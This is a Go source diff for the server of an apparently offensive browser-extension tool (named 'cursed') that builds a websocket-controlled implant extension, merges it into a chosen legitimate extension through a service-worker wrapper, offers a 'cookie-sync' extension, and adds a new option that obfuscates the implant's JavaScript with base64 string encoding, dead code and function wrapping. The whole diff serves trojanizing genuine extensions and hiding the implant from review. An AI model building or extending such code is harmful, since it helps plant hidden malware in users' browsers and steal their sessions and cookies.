@@ -3,13 +3,17 @@ package api
 import (
 	"archive/zip"
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/fs"
+	"math/rand"
 	"net/http"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
+	"time"
 )
 
 const (
@@ -44,9 +48,11 @@ func (e *ExtensionAPI) ListEmbedTargets(w http.ResponseWriter, _ *http.Request) 
 		return
 	}
 
+	excluded := map[string]bool{"main": true, "cookie-sync": true}
+
 	var targets []embedTarget
 	for _, ent := range entries {
-		if !ent.IsDir() || ent.Name() == "main" {
+		if !ent.IsDir() || excluded[ent.Name()] {
 			continue
 		}
 		mf := filepath.Join(base, ent.Name(), "manifest.json")
@@ -70,6 +76,7 @@ func (e *ExtensionAPI) ListEmbedTargets(w http.ResponseWriter, _ *http.Request) 
 func (e *ExtensionAPI) Download(w http.ResponseWriter, r *http.Request) {
 	wsURL := r.URL.Query().Get("ws_url")
 	embed := r.URL.Query().Get("embed")
+	obfuscate := r.URL.Query().Get("obfuscate") == "1"
 
 	if wsURL == "" {
 		host := r.Host
@@ -92,16 +99,26 @@ func (e *ExtensionAPI) Download(w http.ResponseWriter, r *http.Request) {
 	var err error
 	filename := "cursed-chrome-extension.zip"
 
-	if embed != "" && embed != "none" {
+	opts := &buildOpts{wsURL: wsURL, obfuscate: obfuscate}
+
+	if embed == "cookie-sync" {
+		csDir := filepath.Join(base, "cookie-sync")
+		if _, err := os.Stat(csDir); err != nil {
+			JSONErr(w, http.StatusNotFound, "cookie-sync extension not found")
+			return
+		}
+		err = buildPlain(zw, csDir)
+		filename = "cookie-sync-extension.zip"
+	} else if embed != "" && embed != "none" {
 		targetDir := filepath.Join(base, embed)
 		if _, err := os.Stat(targetDir); err != nil {
 			JSONErr(w, http.StatusBadRequest, fmt.Sprintf("embed target %q not found", embed))
 			return
 		}
-		err = buildMerged(zw, mainDir, targetDir, wsURL)
+		err = buildMerged(zw, mainDir, targetDir, opts)
 		filename = fmt.Sprintf("cursed-%s-extension.zip", embed)
 	} else {
-		err = buildStandalone(zw, mainDir, wsURL)
+		err = buildStandalone(zw, mainDir, opts)
 	}
 
 	if err != nil {
@@ -116,18 +133,23 @@ func (e *ExtensionAPI) Download(w http.ResponseWriter, r *http.Request) {
 	w.Write(buf.Bytes())
 }
 
-func buildStandalone(zw *zip.Writer, srcDir, wsURL string) error {
+type buildOpts struct {
+	wsURL     string
+	obfuscate bool
+}
+
+func buildPlain(zw *zip.Writer, srcDir string) error {
 	return filepath.WalkDir(srcDir, func(path string, de fs.DirEntry, err error) error {
 		if err != nil || de.IsDir() {
 			return err
 		}
 		rel, _ := filepath.Rel(srcDir, path)
+		if skipJunk(rel) {
+			return nil
+		}
 		data, err := os.ReadFile(path)
 		if err != nil {
 			return err
-		}
-		if strings.HasSuffix(rel, ".js") {
-			data = bytes.ReplaceAll(data, []byte(wsPlaceholder), []byte(wsURL))
 		}
 		fw, err := zw.Create(rel)
 		if err != nil {
@@ -138,7 +160,40 @@ func buildStandalone(zw *zip.Writer, srcDir, wsURL string) error {
 	})
 }
 
-func buildMerged(zw *zip.Writer, mainDir, targetDir, wsURL string) error {
+func skipJunk(name string) bool {
+	base := filepath.Base(name)
+	return strings.HasPrefix(base, "._") || base == ".DS_Store"
+}
+
+func buildStandalone(zw *zip.Writer, srcDir string, opts *buildOpts) error {
+	return filepath.WalkDir(srcDir, func(path string, de fs.DirEntry, err error) error {
+		if err != nil || de.IsDir() {
+			return err
+		}
+		rel, _ := filepath.Rel(srcDir, path)
+		if skipJunk(rel) {
+			return nil
+		}
+		data, err := os.ReadFile(path)
+		if err != nil {
+			return err
+		}
+		if strings.HasSuffix(rel, ".js") {
+			data = bytes.ReplaceAll(data, []byte(wsPlaceholder), []byte(opts.wsURL))
+			if opts.obfuscate {
+				data = obfuscateJS(data)
+			}
+		}
+		fw, err := zw.Create(rel)
+		if err != nil {
+			return err
+		}
+		_, err = fw.Write(data)
+		return err
+	})
+}
+
+func buildMerged(zw *zip.Writer, mainDir, targetDir string, opts *buildOpts) error {
 	targetManifest, err := readManifest(targetDir)
 	if err != nil {
 		return fmt.Errorf("read target manifest: %w", err)
@@ -155,7 +210,7 @@ func buildMerged(zw *zip.Writer, mainDir, targetDir, wsURL string) error {
 			return err
 		}
 		rel, _ := filepath.Rel(targetDir, path)
-		if rel == "manifest.json" {
+		if rel == "manifest.json" || skipJunk(rel) {
 			return nil
 		}
 		data, _ := os.ReadFile(path)
@@ -169,12 +224,15 @@ func buildMerged(zw *zip.Writer, mainDir, targetDir, wsURL string) error {
 			return err
 		}
 		rel, _ := filepath.Rel(mainDir, path)
-		if rel == "manifest.json" {
+		if rel == "manifest.json" || skipJunk(rel) {
 			return nil
 		}
 		data, _ := os.ReadFile(path)
 		if strings.HasSuffix(rel, ".js") {
-			data = bytes.ReplaceAll(data, []byte(wsPlaceholder), []byte(wsURL))
+			data = bytes.ReplaceAll(data, []byte(wsPlaceholder), []byte(opts.wsURL))
+			if opts.obfuscate {
+				data = obfuscateJS(data)
+			}
 		}
 		fw, _ := zw.Create("_cursed/" + rel)
 		fw.Write(data)
@@ -186,9 +244,13 @@ func buildMerged(zw *zip.Writer, mainDir, targetDir, wsURL string) error {
 	swType, _ := origSW["type"].(string)
 
 	wrapperCode := buildServiceWorkerWrapper(origSWFile, swType)
-	merged["background"] = map[string]interface{}{
+	newBg := map[string]interface{}{
 		"service_worker": "_cursed_sw.js",
 	}
+	if swType != "" {
+		newBg["type"] = swType
+	}
+	merged["background"] = newBg
 
 	fw, _ := zw.Create("_cursed_sw.js")
 	fw.Write([]byte(wrapperCode))
@@ -400,9 +462,11 @@ func (e *ExtensionAPI) UploadTest(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	obfuscate := r.FormValue("obfuscate") == "1"
+
 	buf := new(bytes.Buffer)
 	zw := zip.NewWriter(buf)
-	if err := buildMerged(zw, mainDir, tmpDir, wsURL); err != nil {
+	if err := buildMerged(zw, mainDir, tmpDir, &buildOpts{wsURL: wsURL, obfuscate: obfuscate}); err != nil {
 		JSONErr(w, http.StatusInternalServerError, "inject failed: "+err.Error())
 		return
 	}
@@ -655,4 +719,102 @@ func copyDir(src, dst string) error {
 		}
 		return os.WriteFile(target, data, 0o644)
 	})
+}
+
+// obfuscateJS applies multi-layer obfuscation to JavaScript source code.
+func obfuscateJS(src []byte) []byte {
+	code := string(src)
+	if len(code) < 10 {
+		return src
+	}
+
+	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+
+	code = obfuscateStrings(code, rng)
+	code = insertDeadCode(code, rng)
+	code = wrapWithIIFE(code, rng)
+
+	return []byte(code)
+}
+
+func randVarName(rng *rand.Rand, length int) string {
+	const chars = "abcdefghijklmnopqrstuvwxyz"
+	prefix := string(chars[rng.Intn(len(chars))])
+	b := make([]byte, length-1)
+	for i := range b {
+		b[i] = "abcdefghijklmnopqrstuvwxyz0123456789_"[rng.Intn(37)]
+	}
+	return "_" + prefix + string(b)
+}
+
+var stringLiteralRe = regexp.MustCompile(`'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)"`)
+
+func obfuscateStrings(code string, rng *rand.Rand) string {
+	decoderVar := randVarName(rng, 6)
+
+	var encoded []string
+	result := stringLiteralRe.ReplaceAllStringFunc(code, func(match string) string {
+		inner := match[1 : len(match)-1]
+		if len(inner) < 4 || strings.Contains(inner, "${") {
+			return match
+		}
+		if strings.HasPrefix(match, "'use strict'") || strings.HasPrefix(match, `"use strict"`) {
+			return match
+		}
+		b64 := base64.StdEncoding.EncodeToString([]byte(inner))
+		idx := len(encoded)
+		encoded = append(encoded, b64)
+		return fmt.Sprintf("%s(%d)", decoderVar, idx)
+	})
+
+	if len(encoded) == 0 {
+		return code
+	}
+
+	arrEntries := make([]string, len(encoded))
+	for i, e := range encoded {
+		arrEntries[i] = fmt.Sprintf("'%s'", e)
+	}
+
+	header := fmt.Sprintf("const %s=(function(){const _a=[%s];return function(_i){return atob(_a[_i]);}})();\n",
+		decoderVar, strings.Join(arrEntries, ","))
+
+	return header + result
+}
+
+func insertDeadCode(code string, rng *rand.Rand) string {
+	snippets := []string{
+		fmt.Sprintf("if(typeof %s!=='undefined')void 0;", randVarName(rng, 4)),
+		fmt.Sprintf("var %s=Date.now();", randVarName(rng, 5)),
+		fmt.Sprintf("var %s=Math.random();", randVarName(rng, 4)),
+		fmt.Sprintf("try{void 0}catch(%s){}", randVarName(rng, 2)),
+	}
+
+	lines := strings.Split(code, "\n")
+	if len(lines) < 5 {
+		return code
+	}
+
+	count := 2 + rng.Intn(3)
+	for i := 0; i < count && len(lines) > 3; i++ {
+		pos := 1 + rng.Intn(len(lines)-2)
+		snippet := snippets[rng.Intn(len(snippets))]
+		lines = append(lines[:pos+1], append([]string{snippet}, lines[pos+1:]...)...)
+	}
+
+	return strings.Join(lines, "\n")
+}
+
+func wrapWithIIFE(code string, rng *rand.Rand) string {
+	if strings.HasPrefix(strings.TrimSpace(code), "import") ||
+		strings.HasPrefix(strings.TrimSpace(code), "export") {
+		return code
+	}
+
+	if strings.Contains(code, "importScripts") {
+		return code
+	}
+
+	param := randVarName(rng, 4)
+	return fmt.Sprintf("(function(%s){%s\n}).call(this,void 0);\n", param, code)
 }
